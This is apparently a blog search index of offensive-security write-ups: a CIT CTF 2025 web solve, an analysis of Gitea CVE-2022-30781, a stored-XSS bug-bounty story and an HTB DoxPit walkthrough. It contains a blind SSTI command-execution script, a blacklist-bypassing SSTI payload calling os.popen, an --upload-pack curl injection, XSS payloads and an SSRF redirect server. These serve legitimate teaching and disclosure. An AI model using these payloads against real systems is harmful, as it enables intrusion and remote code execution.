[{"content":"Hi, I\u0026rsquo;m MindPatch, a cybersecurity engineer and offensive security specialist. I focus on:\nPenetration testing Bug bounty hunting Vulnerability research Security automation Capture the Flag (CTF) competitions With deep experience in offensive tooling, scripting, and red team tactics, I aim to share practical security knowledge and challenge walkthroughs with the community.\nYou can reach me at: hello@mindpatch.net\n","permalink":"http://localhost:1313/about/","summary":"\u003cp\u003eHi, I\u0026rsquo;m \u003cstrong\u003eMindPatch\u003c/strong\u003e, a cybersecurity engineer and offensive security specialist. I focus on:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePenetration testing\u003c/li\u003e\n\u003cli\u003eBug bounty hunting\u003c/li\u003e\n\u003cli\u003eVulnerability research\u003c/li\u003e\n\u003cli\u003eSecurity automation\u003c/li\u003e\n\u003cli\u003eCapture the Flag (CTF) competitions\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eWith deep experience in offensive tooling, scripting, and red team tactics, I aim to share practical security knowledge and challenge walkthroughs with the community.\u003c/p\u003e\n\u003cp\u003eYou can reach me at: \u003ca href=\"mailto:hello@mindpatch.net\"\u003ehello@mindpatch.net\u003c/a\u003e\u003c/p\u003e","title":"About Me"},{"content":"","permalink":"http://localhost:1313/projects/lotus/","summary":"","title":"Lotus"},{"content":"","permalink":"http://localhost:1313/projects/vulfy/","summary":"","title":"Vulfy"},{"content":"","permalink":"http://localhost:1313/projects/lorsrf/","summary":"","title":"Lorsrf"},{"content":"Hello, I joined the CTF for fun during the weekend.\nI focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.\nMr. Chatbot The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn\u0026rsquo;t an LLM attack — responses came from JavaScript files.\nAfter entering a name, you get a session value that can be decoded with flask-unsign:\n$ flask-unsign --unsign --cookie \u0026#34;eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk\u0026#34; --secret=\u0026#34;9f3IC3uj9^zZ\u0026#34; [*] Session decodes to: {\u0026#39;admin\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;hacker\u0026#39;} After trying injections with no luck, I did parameter fuzzing and found the admin=1 parameter. This revealed new session data:\n$ flask-unsign --unsign --cookie \u0026#34;.eJwdzE0LgjAAxvHvsksEHVoJUdEpe7M2C2S63cyJTacIFprRd--x2397ftuHxLo0FVkRSiakissUmT6TOm6aVo_G63GGO43tZTSmy0xM5XvZyoj3enarzkFjzqF-3ENRSCNz1heL6PiwzHaO7LMaXfJ956hwn6QHUVzQfqDQrL3SbjpYTmFzL0ndguKc822NfUe5Haz2omPWMfpvGJsrtAoEzMmBNwpOuXZ4M4d1fAEb_v-be4b1ftBsyPcHZ6hN0g.aAwwvA.ouiTuVJ131_fQmyqYgewMTM-ZlM\u0026#34; --secret=\u0026#34;9f3IC3uj9^zZ\u0026#34; [*] Session decodes to: {\u0026#39;admin\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;name\u0026#39;: \u0026#34;hacker\u0026#34;, \u0026#39;uid\u0026#39;: \u0026#39;L2V0Yy9wYXNzd2QnKTsiKWdhbWVkYiYjMzk7XHhlMlx4YzgpXHhmNFx4ZWFceGVkLFx4OTZceGMwP1x0XHhlN1x4YjJceDk1XHhjNCpceGE1Nlx4OTdJXHgxM1x4OTdceDljZ1x4ZTVceGI4XHhiZlx4ZDlceGE3XHg4OVx4OWJceDk3JiMzOTs=\u0026#39;} As you see there\u0026rsquo;s a new variable (UID), I tried doing some injections like SSTI and got it :)\nWell The idea now to get secrets.txt file blindly, I wrote a script that uses head command if char is valid then sleep 5 seconds\nimport requests import string import time CHARS = string.printable FOUND = \u0026#34;\u0026#34; POSITION = len(FOUND) + 1 def make_payload(position, the_char): # Use a simple command to compare single character cmd = f\u0026#39;[ \u0026#34;$(head -c {position} secrets.txt | tail -c 1)\u0026#34; = \u0026#34;{the_char}\u0026#34; ] \u0026amp;\u0026amp; sleep 5\u0026#39; payload = \u0026#34;{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;\u0026#34;+cmd+\u0026#34;\u0026#39;).read() }}\u0026#34; return payload def exploit(): global FOUND, POSITION # Continue until we\u0026#39;ve found enough characters or need to stop max_positions = 100 # Set a reasonable limit consecutive_spaces = 0 # Track consecutive spaces to detect end of file while POSITION \u0026lt;= max_positions and consecutive_spaces \u0026lt; 5: # Stop after 5 consecutive spaces found_char = False for ch in CHARS: if ch in [\u0026#39;\u0026#34;\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;\\r\u0026#39;]: # Skip problematic chars continue print(f\u0026#34;Position {POSITION}, trying character: {ch}\u0026#34;) start_time = time.time() try: r = requests.post( \u0026#34;http://23.179.17.40:58005/\u0026#34;, allow_redirects=False, data={\u0026#34;name\u0026#34;: make_payload(POSITION, ch), \u0026#34;admin\u0026#34;: \u0026#34;1\u0026#34;}, proxies={\u0026#34;http\u0026#34;: \u0026#34;http://localhost:8080\u0026#34;}, timeout=10 ) elapsed_time = time.time() - start_time if elapsed_time \u0026gt;= 4.5: # Slightly lower threshold to account for network variability FOUND += ch found_char = True # Reset consecutive spaces counter if we found a non-space if ch != \u0026#39; \u0026#39;: consecutive_spaces = 0 else: consecutive_spaces += 1 print(f\u0026#34;Found character at position {POSITION}: {ch}\u0026#34;) print(f\u0026#34;Current secret: {FOUND}\u0026#34;) break except requests.exceptions.Timeout: # If timeout occurs, the character matched FOUND += ch found_char = True # Reset consecutive spaces counter if we found a non-space if ch != \u0026#39; \u0026#39;: consecutive_spaces = 0 else: consecutive_spaces += 1 print(f\u0026#34;Found character at position {POSITION} (timeout): {ch}\u0026#34;) print(f\u0026#34;Current secret: {FOUND}\u0026#34;) break except Exception as e: print(f\u0026#34;Error with character {ch} at position {POSITION}: {e}\u0026#34;) if not found_char: FOUND += \u0026#34; \u0026#34; consecutive_spaces += 1 print(f\u0026#34;No character found at position {POSITION}, adding space and continuing\u0026#34;) print(f\u0026#34;Current secret: {FOUND}\u0026#34;) print(f\u0026#34;Consecutive spaces: {consecutive_spaces}\u0026#34;) POSITION += 1 time.sleep(1) def main(): print(f\u0026#34;Starting blind exploitation from existing credentials: {FOUND}\u0026#34;) print(f\u0026#34;Starting at position: {POSITION}\u0026#34;) exploit() print(f\u0026#34;Final extracted secret: {FOUND}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() And after running it got the flag :)\n$ python exp.py admin:9f3IC3uj9^zZ CIT{18a7fbedb4f3548f} How I Parsed your JSON This challenge reads JSON files locally and provides a SQL-like syntax to extract data. You can add * to the query to extract all columns.\nThe useful finding was converting the container parameter into a list with ?container[]=. This showed a debug page with source code.\nThe code simply removes ../ and file extensions from the container name to prevent LFI. This can be bypassed with ..//file.txt.txt.\n/select?record=*\u0026amp;container=../../../..//app//secrets.txt.txt Commit \u0026amp; Order: Version Control Unit This challenge was straightforward. I discovered an exposed /.git directory on the server and dumped the repository using the git-dump tool.\nAfter examining the commit history, I found older commits that contained the source code with hardcoded admin credentials. This is a common security mistake where developers remove sensitive information in later commits but forget that the data remains accessible in the Git history.\nThe steps to solve were:\nIdentify the exposed Git repository at /.git Download the repository using git-dump Review commit history with git log Check older commits with git show [commit-hash] Find the source code file containing the hardcoded admin password in admin.php Use the credentials to access the admin panel and retrieve the flag Breaking Authentication This challenge featured a straightforward SQL injection vulnerability in the login page.\nSteps to solve:\nAccessed the database and dumped its contents Found the flag stored in the \u0026lsquo;secrets\u0026rsquo; table Classic example of an unsanitized input field allowing SQL injection to compromise a web application\u0026rsquo;s authentication mechanism.\nKeeping Up with the Credentials This challenge required first solving another challenge to obtain valid username and password credentials.\nSteps to solve:\nUsed credentials obtained from the previous challenge to log in After login, got redirected to /debug.php which was an empty page Noticed that accessing /admin.php directly would automatically log you out Modified the login request to include the parameter admin=true using POST method Successfully redirected to /admin.php with admin privileges Retrieved the flag from the admin page Pretty Simple :v\n","permalink":"http://localhost:1313/posts/2025-04-28-cit-ctf/","summary":"\u003cp\u003eHello, I joined the CTF for fun during the weekend.\u003c/p\u003e\n\u003cp\u003eI focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.\u003c/p\u003e\n\u003ch2 id=\"mr-chatbot\"\u003eMr. Chatbot\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"Mr. Chatbot Challenge\" loading=\"lazy\" src=\"https://miro.medium.com/v2/resize:fit:952/1*kvW3lucpnNq6fTtQ9Y_BBA.png\"\u003e\u003c/p\u003e\n\u003cp\u003eThe application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn\u0026rsquo;t an LLM attack — responses came from JavaScript files.\u003c/p\u003e","title":"[CIT CTF 2025] Solving all Web challenges"},{"content":" How Git Fetch Resulted in Critical Remote Code Execution in Gitea\nGood Morning, Everyone!\nIn today’s post, I’ll dive into an analysis of CVE-2022–30781, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.\nHere’s what we’ll cover:\nUnderstanding How the CVE Works Writing Our Own Exploit How the Gitea Team Fixed It Let’s jump in and enjoy\nImport your Git repo here in every git platform like gitea, it has a feature that allows you to import all your repo from another platform or different git server into your platform in single click which called Migration\nbut beside .git repo it\u0026rsquo;s also provides some other options to\npull requests Wiki page issues and in order to extract these data gitea communicate with the chosen platform API in order to import this data\nand in one of these options is migrate a repo from another gitea server, and by choosing this option you can notice in logs a few requests from gitea for these endpoints\nand one of these endpoints returns the repo pull requests information including the pull request branch, and then gitea will fetch this branch using $ git fetch \u0026lt;remote\u0026gt; \u0026lt;branch\u0026gt;\nand as you can see, we cannot Espace using whitespace here in order to get that RCE\nFetch options The Fetch git subcommand has a few different options you can find here (Git — git-fetch Documentation)\nand the interesting one here is — upload-pack option\n— upload-pack When given, and the repository to fetch from is handled by git fetch-pack, --exec=\u0026lt;upload-pack\u0026gt; is passed to the command to specify non-default path for the command run on the other end.\nSo, Using this option lets us change the default path of the git-upload-pack tool. This can potentially lead to Remote Code Execution (RCE).\nTo exploit this, we could inject --upload-pack='CMD' into a branch name or a remote repository. However, Git itself doesn’t allow this directly. 😞\nBut as mentioned earlier, Gitea servers use APIs to fetch repository information. So, we can set up a mock server to return fake data. When the server asks for the pull request branch, we can include the --upload-pack option in the response and check if it gets executed\nWriting The Exploit In writing the exploit process I always chose python as its the fastest and painless option for me, but you can pick what you like\nlets go write our exploit, and this one requires us first to see what gitea api client expect the response so we make sure it gets parsed right\nand this step can be done easily after analysing the gitea Swagger file, and after review it I came up with this simple API written in FastAPI\nfrom fastapi import APIRouter router = APIRouter(prefix=\u0026#34;/api/v1\u0026#34;) RCE_PAYLOAD = \u0026#34;curl ID.oast.fun\u0026#34; # Mock data for some endpoints MAX_RESPONSE_ITEMS = 50 DEFAULT_PAGING_NUM = 30 DEFAULT_GIT_TREES_PER_PAGE = 1000 DEFAULT_MAX_BLOB_SIZE = 10485760 full_uri = \u0026#34;http://localhost:3000/\u0026#34; @router.get(\u0026#34;/version\u0026#34;) async def get_version(): return {\u0026#34;version\u0026#34;: \u0026#34;1.16.6\u0026#34;} @router.get(\u0026#34;/settings/api\u0026#34;) async def get_settings(): return { \u0026#34;max_response_items\u0026#34;: MAX_RESPONSE_ITEMS, \u0026#34;default_paging_num\u0026#34;: DEFAULT_PAGING_NUM, \u0026#34;default_git_trees_per_page\u0026#34;: DEFAULT_GIT_TREES_PER_PAGE, \u0026#34;default_max_blob_size\u0026#34;: DEFAULT_MAX_BLOB_SIZE, } @router.get(\u0026#34;/repos/{owner}/{repo}\u0026#34;) async def get_repo_info(owner: str, repo: str): \u0026#34;\u0026#34;\u0026#34; Returns repository information for a given owner and repo. \u0026#34;\u0026#34;\u0026#34; return { \u0026#34;clone_url\u0026#34;: f\u0026#34;{full_uri}{owner}/{repo}\u0026#34;, \u0026#34;owner\u0026#34;: {\u0026#34;login\u0026#34;: owner}, } @router.get(\u0026#34;/repos/{owner}/{repo}/topics\u0026#34;) async def get_repo_topics(owner: str, repo: str): return {\u0026#34;topics\u0026#34;: []} @router.get(\u0026#34;/repos/{owner}/{repo}/pulls\u0026#34;) async def get_repo_pulls(owner: str, repo: str): \u0026#34;\u0026#34;\u0026#34; Returns pull requests for a given repository. \u0026#34;\u0026#34;\u0026#34; return [ { \u0026#34;base\u0026#34;: {\u0026#34;ref\u0026#34;: \u0026#34;master\u0026#34;}, \u0026#34;head\u0026#34;: { \u0026#34;ref\u0026#34;: f\u0026#34;--upload-pack={RCE_PAYLOAD}\u0026#34;, \u0026#34;repo\u0026#34;: { \u0026#34;clone_url\u0026#34;: \u0026#34;./\u0026#34;, \u0026#34;owner\u0026#34;: {\u0026#34;login\u0026#34;: \u0026#34;master\u0026#34;}, }, }, \u0026#34;updated_at\u0026#34;: \u0026#34;2001-01-01T05:00:00+01:00\u0026#34;, \u0026#34;user\u0026#34;: {}, } ] As you can see in the pulls endpoint, I was able to inject the --upload-pack option into the ref, which corresponds to the pull request\u0026rsquo;s base branch.\nNow, let’s test it. I ran the API, created a new migration in Gitea, and set the repository URL to myapi/test/test. Additionally, I enabled the option to fetch pull requests, ensuring that it pulls the repository\u0026rsquo;s pull requests during the migration process\nAnd as you can See :)\nIn the background, the following command was executed:\n$ git fetch origin --upload-pack='curl \u0026lt;host\u0026gt;'\nThis caused Gitea to make the specified curl request, demonstrating that the RCE was successfully exploited as a proof of concept (PoC)\nPatching the bug Gitea team fixed this bug by using --, which forces Git to treat everything following it as a plain string rather than a parsable option, This effectively resolves the issue.\nAnd that’s it! I hope you found this helpful.\nYou can access the testing lab and the exploit at:\nlatestpocs/CVE-2022–30781/gitea_poc at master · MindPatch/latestpocs\nTake care, and see you next time! 🙂\n","permalink":"http://localhost:1313/posts/2024-01-10-analysis-of-cve-202230781/","summary":"\u003chr\u003e\n\u003cp\u003eHow Git Fetch Resulted in Critical Remote Code Execution in Gitea\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://miro.medium.com/v2/resize:fit:477/0*7XgQCsp0nd9dRoQo.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eGood Morning, Everyone!\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eIn today’s post, I’ll dive into an analysis of  \u003cstrong\u003eCVE-2022–30781\u003c/strong\u003e, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.\u003c/p\u003e\n\u003cp\u003eHere’s what we’ll cover:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eUnderstanding How the CVE Works\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWriting Our Own Exploit\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHow the Gitea Team Fixed It\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eLet’s jump in and enjoy\u003c/p\u003e","title":"Analysis of CVE-2022–30781"},{"content":"\n—\nAlright, let me tell you a fun story about how a casual day of hunting bugs turned into a serious jackpot — all thanks to some forgotten open source library!\nIt started like any other day: coffee ready, Burp Suite fired up, and enthusiasm maxed out. I was testing a cool AI-driven reporting/training platform over at example.ai.\nThese folks were pretty solid when it came to securing their main endpoints; my usual payloads and tests didn’t reveal much initially. However, the moment I stumbled onto their /reports page, my curiosity went through the roof. This page was super interactive—it allowed users to create detailed, professional-looking reports with graphs, charts, images, markdown support, etc ..\nI tried finding any bugs on this feature but didn’t ended well unfortunately\nBut after searching around their github organization repos I found a library called utils_libs and its README.md says that let you create report using python in automated way\nand I revealed two versions of their report library: utils.report.v1 and utils_libs.report.v2. Considering organizations often neglect older SDK versions during updates, I wondered whether the older v1 endpoint might still be active\nCuriosity piqued, I quickly whipped up a test script using the old, seemingly abandoned v1 API:\nimport utils_libs import utils_libs.reports.v1 as ul # Setup credentials entity = \u0026#34;\u0026lt;REPLACE\u0026gt;\u0026#34; project = \u0026#34;\u0026lt;REPLACE\u0026gt;\u0026#34;# Creating a sneaky report report = ul.Report( entity=entity, project=project, title=\u0026#34;XSS HERE BE AWARE\u0026#34;, description=\u0026#34;Never gonna give you up, never gonna let you down\u0026#34; )# Injecting our little surprise report.save() after running the script I got the report created on the UI successfully.\nI add burpsuite in the mid of the library requests to track it down and I noticed it calls different endpoints!\nWhen using this endpoint, there is no XSS (Cross-Site Scripting) filter applied to functions that are intended to add links for the report writer. Below is an example of how this vulnerability can be exploited:\nimport utils_libs import utils_libs.reports.v1 as ul # Initialize the utils_libs API api = utils_libs.Api()# Define the entity and project entity = \u0026#34;\u0026lt;REPLACE\u0026gt;\u0026#34; # Replace with your utils_libs entity project = \u0026#34;\u0026lt;REPLACE\u0026gt;\u0026#34; # Replace with your utils_libs project# Create a new report report = ul.Report( entity=entity, project=project, title=\u0026#34;XSS HERE - BE AWARE\u0026#34;, description=\u0026#34;Never gonna give you up, never gonna let you down\u0026#34; )# Add a block with an XSS payload report.blocks = [ul.Twitter(\u0026#39;\u0026#34;\u0026gt;\u0026lt;svg/onload=alert()\u0026gt;\u0026#39;)]# Save the report report.save() This code successfully stored an XSS payload, which can be accessed via the URL example.ai/reports/\u0026lt;reportid\u0026gt;. Notably, this report can be viewed by anyone, even if they are not part of my organization\nBut wait, there’s more! After the excitement of the first payout wore off, I thought, “why not dig a bit deeper?”\nRevisiting their repository, I found another interesting feature — embedding videos into reports. Now, embedding videos seemed innocent enough, but experience taught me never to underestimate innocent-looking functionalities.\nSo, I gave it a try:\nreport = ul.Report( entity=entity, project=project, title=\u0026#34;Another Sneaky XSS\u0026#34;, description=\u0026#34;Keep calm and hack responsibly\u0026#34; ) report.pages = [ul.Video(\u0026#39;javascript:alert()\u0026#39;)] report.save() And bingo! Another stored XSS! But this wasn’t just any simple vulnerability — this time, it was even more impactful.\nBy chaining this XSS with another minor misconfiguration, I escalated it to full account takeover.\nThat meant I could completely control someone’s account just by tricking them into viewing my crafted report.\nThe team this time higher the impact and higher the bounty which is a good win\nSide Hint: Always dig deeper into seemingly unrelated or forgotten resources. Old API docs, outdated Python SDKs, archived repositories, or forgotten JavaScript files might contain hidden parameters or endpoints. These endpoints often bypass filters or security checks because they aren’t actively maintained, potentially leading to undiscovered vulnerabilities.\nAnd that’s it\nBye ..\n","permalink":"http://localhost:1313/posts/legacy-sdk-xss-account-takeover/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://miro.medium.com/v2/resize:fit:480/0*wFXpWUgkd4CNm-ov.gif\"\u003e\u003c/p\u003e\n\u003cp\u003e—\u003c/p\u003e\n\u003cp\u003eAlright, let me tell you a fun story about how a casual day of hunting bugs turned into a serious jackpot — all thanks to some forgotten open source library!\u003c/p\u003e\n\u003cp\u003eIt started like any other day: coffee ready, Burp Suite fired up, and enthusiasm maxed out. I was testing a cool AI-driven reporting/training platform over at example.ai.\u003c/p\u003e\n\u003cp\u003eThese folks were pretty solid when it came to securing their main endpoints; my usual payloads and tests didn’t reveal much initially. However, the moment I stumbled onto their  \u003ccode\u003e/reports\u003c/code\u003e  page, my curiosity went through the roof. This page was super interactive—it allowed users to create detailed, professional-looking reports with graphs, charts, images, markdown support, etc ..\u003c/p\u003e","title":"Legacy SDK Flaws Cause Stored XSS and Account Takeover"},{"content":"[HTB] Solving DoxPit Challange In this write-up, I’ll walk you through the process of solving the HTB DoxPit challenge\nThis challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, I’ll show you how to exploit these vulnerabilities and successfully capture the flag\nLet’s dive into the details!\nGetting Started The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app.\nThe Flask app, running locally, was vulnerable to Server-Side Template Injection (SSTI) due to its use of render_template_string\n# app.py @web.route(\u0026#34;/home\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) @auth_middleware def feed(): directory = request.args.get(\u0026#34;directory\u0026#34;) if not directory: dirs = os.listdir(os.getcwd()) return render_template(\u0026#34;index.html\u0026#34;, title=\u0026#34;home\u0026#34;, dirs=dirs) if any(char in directory for char in invalid_chars): return render_template(\u0026#34;error.html\u0026#34;, title=\u0026#34;error\u0026#34;, error=\u0026#34;invalid directory\u0026#34;), 400 try: with open(\u0026#34;./application/templates/scan.html\u0026#34;, \u0026#34;r\u0026#34;) as file: template_content = file.read() results = scan_directory(directory) template_content = template_content.replace(\u0026#34;{{ results.date }}\u0026#34;, results[\u0026#34;date\u0026#34;]) template_content = template_content.replace(\u0026#34;{{ results.scanned_directory }}\u0026#34;, results[\u0026#34;scanned_directory\u0026#34;]) return render_template_string(template_content, results=results) except Exception as e: return render_template(\u0026#34;error.html\u0026#34;, title=\u0026#34;error\u0026#34;, error=e), 500 However, since this app was running locally, our only access was through the NextJS app, which provided the user interface (UI)\nIdentifying the SSRF Vulnerability I took a look at the package.json file of the NextJS app and saw that it was using version 14.1.0\nThis version is known to be vulnerable to Server-Side Request Forgery (SSRF) when using the redirect function from next/navigation\nSpecifically, I found that the doRedirect function in serverAction.tsx, which was used in the home page posts links, utilized this function\n\u0026#34;use server\u0026#34;; import { redirect } from \u0026#34;next/navigation\u0026#34;; export async function doRedirect() { redirect(\u0026#34;/error\u0026#34;); } \u0026lt;form action={doRedirect}\u0026gt; \u0026lt;button className=\u0026#34;link-light\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;{paste.title}\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; Exploiting SSRF To exploit this vulnerability, I began by intercepting requests from the home page using Burp Suite, the goal was to modify the Host and Origin headers to point to my server\nBefore diving into this, I added Burp Collaborator to test if I would receive any requests from the application\nThis step was crucial to confirm that the application was interacting with my server as expected\nAnd yep got it 🎉\nI then configured Burp Suite to respond with a 302 redirect to 0.0.0.0:3000\nTo test this, I set up a simple Flask application to serve as a local endpoint\n# got it from: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io from flask import Flask, Response, request, redirect app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;, defaults={\u0026#39;path\u0026#39;: \u0026#39;\u0026#39;}) @app.route(\u0026#39;/\u0026lt;path:path\u0026gt;\u0026#39;) def catch(path): if request.method == \u0026#39;HEAD\u0026#39;: resp = Response(\u0026#34;\u0026#34;) resp.headers[\u0026#39;Content-Type\u0026#39;] = \u0026#39;text/x-component\u0026#39; return resp return redirect(\u0026#39;http://0.0.0.0:3000\u0026#39;) Accessing the Internal App After configuring Burp Suite to redirect requests to this local Flask server, I was able to access the internal Flask application running on port 3000\nThe next step was to interact with the application, starting by registering a new account, as the application required registration for further actions\nThe registration endpoint allowed us to create an account using a simple GET request\n@web.route(\u0026#34;/register\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def register(): username = request.args.get(\u0026#34;username\u0026#34;) password = request.args.get(\u0026#34;password\u0026#34;) if not username or not password: return render_template(\u0026#34;register.html\u0026#34;, title=\u0026#34;register\u0026#34;) db_session = Database() token = generate(16) user_valid = db_session.create_user(username, password, token) if not user_valid: return render_template(\u0026#34;error.html\u0026#34;, title=\u0026#34;error\u0026#34;, error=\u0026#34;user exists\u0026#34;), 401 return render_template(\u0026#34;error.html\u0026#34;, title=\u0026#34;success\u0026#34;, error=f\u0026#34;User created with token: {token}\u0026#34;), 200 So I changed my server to point to [http://0.0.0.0:3000/register?username=kebda\u0026amp;password=3afroto](http://0.0.0.0:3000/register?username=kebda\u0026amp;password=3afroto)\nWith the account successfully created, the application returned a session token\nUsing this token, I could now authenticate and access protected areas of the application, I appended the token to the URL to authenticate: http://0.0.0.0:3000/home?token=c84964fbd5a45090c841695b2a7d8530\n# auth handling function def auth_middleware(func): def check_user(*args, **kwargs): db_session = Database() if not session.get(\u0026#34;loggedin\u0026#34;): if request.args.get(\u0026#34;token\u0026#34;) and db_session.check_token(request.args.get(\u0026#34;token\u0026#34;)): return func(*args, **kwargs) else: return redirect(\u0026#34;/login\u0026#34;) return func(*args, **kwargs) check_user.__name__ = func.__name__ return check_user This step was crucial, as it allowed me to gain access to the authenticated portions of the site where the SSTI vulnerability could be further exploited:D\nlet’s jump into directory parameter to get this SSTI!\nI initially tried common payloads like {{1*8}}, but these were blocked due to a blacklist filtering out certain characters:(\ninvalid_chars = [\u0026#34;{{\u0026#34;, \u0026#34;}}\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;,\u0026#34;\\\\\u0026#34;, \u0026#34;x\u0026#34;] if any(char in directory for char in invalid_chars): return render_template(\u0026#34;error.html\u0026#34;, title=\u0026#34;error\u0026#34;, error=\u0026#34;invalid directory\u0026#34;), 400 Bypassing the Blacklist To bypass this filter, I searched for alternative approaches and found a method in this article\nThe idea was to use another input parameter to read the payload, this approach involved crafting a payload that would bypass the filter\n+---------------------------+ | Main Input | | (Filtered by blacklist) | +---------------------------+ | v +---------------------------+ | Alternative | | Input Parameter | | (Not filtered) | +---------------------------+ | v +---------------------------+ | Payload Injection | | (Bypassing the filter) | +---------------------------+ | v +---------------------------+ | Final Output | | (Executed Command Result)| +---------------------------+ And that’s the payload I came with\n\u0026amp;#123;%with output=((((request|attr(\u0026#39;application\u0026#39;))|attr(request|attr(\u0026amp;quot;args\u0026amp;quot;)|attr(\u0026amp;quot;get\u0026amp;quot;)(\u0026amp;#39;globals\u0026amp;#39;)))|attr(request|attr(\u0026amp;quot;args\u0026amp;quot;)|attr(\u0026amp;quot;get\u0026amp;quot;)(\u0026amp;#39;getitem\u0026amp;#39;)))(request|attr(\u0026amp;quot;args\u0026amp;quot;)|attr(\u0026amp;quot;get\u0026amp;quot;)(\u0026amp;#39;builtins\u0026amp;#39;))|attr(request|attr(\u0026amp;quot;args\u0026amp;quot;)|attr(\u0026amp;quot;get\u0026amp;quot;)(\u0026amp;#39;getitem\u0026amp;#39;)))(request|attr(\u0026amp;quot;args\u0026amp;quot;)|attr(\u0026amp;quot;get\u0026amp;quot;)(\u0026amp;#39;import\u0026amp;#39;)))(\u0026amp;#39;os\u0026amp;#39;)|attr(\u0026amp;#39;popen\u0026amp;#39;)(request|attr(\u0026amp;quot;args\u0026amp;quot;)|attr(\u0026amp;quot;get\u0026amp;quot;)(\u0026amp;#39;cmd\u0026amp;#39;))|attr(\u0026amp;#39;read\u0026amp;#39;)()%\u0026amp;#125;\u0026amp;#123;%print(output)%\u0026amp;#125;\u0026amp;#123;%endwith%\u0026amp;#125;\u0026amp;globals=__globals__\u0026amp;getitem=__getitem__\u0026amp;builtins=__builtins__\u0026amp;import=__import__\u0026amp;cmd= To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters\ninvalid_chars = [\u0026quot;{{\u0026quot;, \u0026quot;}}\u0026quot;, \u0026quot;.\u0026quot;, \u0026quot;_\u0026quot;, \u0026quot;[\u0026quot;, \u0026quot;]\u0026quot;,\u0026quot;\\\\\u0026quot;, \u0026quot;x\u0026quot;]\nI replaced blacklisted characters and patterns with alternatives:\n**{{** was replaced with **{%**. **}}** was replaced with **%}**. **.** was bypassed by using attribute chaining through the request object. **_** was avoided by using alternative attribute names and methods. **[** and **]** were substituted with attribute access via attr(). **\\\\** and **x** were sidestepped by constructing the payload in a way that didn\u0026rsquo;t require these characters. I navigated through the request attributes to access Python’s globals and builtins dictionaries, using the import function, I imported the os module and used its popen method to OS execute commands\n— — — — — — — — — — — — — — — — -\nAnd Successfully executed the id command, confirming root access\nhttp://0.0.0.0:3000/home?token=\u0026lt;\u0026gt;\u0026amp;directory=\u0026amp;#123;%with output=((((request|attr(\u0026#39;application\u0026#39;))|attr(request|attr(\u0026#34;args\u0026#34;)|attr(\u0026#34;get\u0026#34;)(\u0026#39;globals\u0026#39;)))|attr(request|attr(\u0026#34;args\u0026#34;)|attr(\u0026#34;get\u0026#34;)(\u0026#39;getitem\u0026#39;)))(request|attr(\u0026#34;args\u0026#34;)|attr(\u0026#34;get\u0026#34;)(\u0026#39;builtins\u0026#39;))|attr(request|attr(\u0026#34;args\u0026#34;)|attr(\u0026#34;get\u0026#34;)(\u0026#39;getitem\u0026#39;)))(request|attr(\u0026#34;args\u0026#34;)|attr(\u0026#34;get\u0026#34;)(\u0026#39;import\u0026#39;))(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(request|attr(\u0026#34;args\u0026#34;)|attr(\u0026#34;get\u0026#34;)(\u0026#39;cmd\u0026#39;))|attr(\u0026#39;read\u0026#39;)()%\u0026amp;#125;\u0026amp;#123;%print(output)%\u0026amp;#125;\u0026amp;#123;%endwith%\u0026amp;#125;\u0026amp;globals=__globals__\u0026amp;getitem=__getitem__\u0026amp;builtins=__builtins__\u0026amp;import=__import__\u0026amp;cmd=id Nice, Root:)\nRan ls -lah / to list the system files, which revealed the flag\u0026rsquo;s location\nnice flag is there, lets use catto read the flag from the file, successfully retrieving it\nAnd That’s it\nBye UwU\n","permalink":"http://localhost:1313/posts/solving-doxpit-challenge/","summary":"\u003ch1 id=\"htb-solving-doxpit-challange\"\u003e[HTB] Solving DoxPit Challange\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://miro.medium.com/v2/resize:fit:700/1*tWUMuT1J0TUSBua9hOmWcg.png\"\u003e\u003c/p\u003e\n\u003cp\u003eIn this write-up, I’ll 